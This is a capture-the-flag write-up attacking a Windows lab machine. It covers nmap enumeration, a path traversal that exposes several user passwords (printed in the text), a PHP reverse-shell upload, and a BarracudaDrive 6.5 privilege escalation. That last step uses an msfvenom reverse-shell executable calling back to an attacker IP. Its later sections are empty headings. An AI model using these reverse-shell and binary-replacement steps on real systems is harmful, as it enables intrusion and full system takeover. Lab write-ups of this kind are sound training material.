#Pwned! 
```IP
192.168.150.127
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.150.127 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3306/tcp  open  mysql?        syn-ack ttl 125
| mysql-info:
|_  MySQL Error: Host '192.168.45.189' is not allowed to connect to this MariaDB server
| fingerprint-strings:
|   Help, Kerberos, NULL, NotesRPC, WMSRequest, X11Probe, afp:
|_    Host '192.168.45.189' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8000/tcp  open  http-alt      syn-ack ttl 125 BarracudaServer.com (Windows)
30021/tcp open  ftp           syn-ack ttl 125 FileZilla ftpd 0.9.41 beta                
33033/tcp open  unknown       syn-ack ttl 125
44330/tcp open  ssl/unknown   syn-ack ttl 125                                           45332/tcp open  http          syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)                
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
45443/tcp open  http          syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)                
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## FTP 30021
FileZilla ftpd 0.9.41 beta
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211092557.png?raw=true)

## HTTP 8000
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211090801.png?raw=true)
BarracudaDrive 6.5
PE https://www.exploit-db.com/exploits/48789
fuzzing different extensions to upload a file
```
ffuf -request files/ext.req -request-proto http -w /usr/share/SecLists-master/Fuzzing/extensions-Bo0oM.txt
```
none works

## HTTP 33033
we can update passwords
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211094745.png?raw=true)
and we can path traversal to other users and see their passwords
```
4qpdR87QYjRbog
xuk1EuP3N/rCpA
AJqKXnKVwhcSkg
WgsjOZwtOyCRSg
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211095528.png?raw=true)
# Exploitation

it is possible to navigate through directories in HTTP 8000. I got stuck a lot of time because I couldnt click on C, so it didn't seem like a directory....
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211105130.png?raw=true)
Once a revshell has been uploaded to the latter directory, you can access it via  
```
http://192.168.150.127:45332/shell2.php
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211105019.png?raw=true)
and type the local flag
# PrivEsc

## Manual
lets try the PE vulnerability found in BarracudaDrive 6.5
https://www.exploit-db.com/exploits/48789

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211105508.png?raw=true)
create a malicious revshell. substitute bd.exe and restart the computer
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe > reverse.exe
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211110042.png?raw=true)
we are nt authority system
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211110129.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

